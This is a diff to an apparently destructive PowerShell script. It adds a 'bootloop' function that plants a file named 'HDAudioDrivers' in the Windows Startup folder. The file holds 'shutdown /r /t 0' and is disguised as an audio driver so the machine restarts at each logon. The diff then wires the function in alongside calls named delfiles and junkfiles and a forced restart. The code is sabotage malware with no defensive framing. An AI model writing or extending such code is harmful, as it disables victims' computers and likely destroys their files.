@@ -67,8 +67,28 @@ foreach ($path in $targetPaths) {
 }
 }
 
+function bootloop {
+    param (
+        # Put your path between the quotes below!
+        [string]$Path = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
+    )
+
+    process {
+        # ... the rest of the logic stays the same ...
+        if (!(Test-Path -Path $Path)) {
+            New-Item -ItemType Directory -Path $Path -Force | Out-Null
+        }
+
+        $FilePath = Join-Path -ChildPath "HDAudioDrivers" -Path $Path
+        "shutdown /r /t 0" | Out-File -FilePath $FilePath -Encoding ascii
+
+        Write-Host "startup entry successful" -ForegroundColor Cyan
+    }
+}
+
 admin
 delfiles
 Start-Sleep -Seconds 0.1
 junkfiles
+bootloop
 Restart-Computer -Force
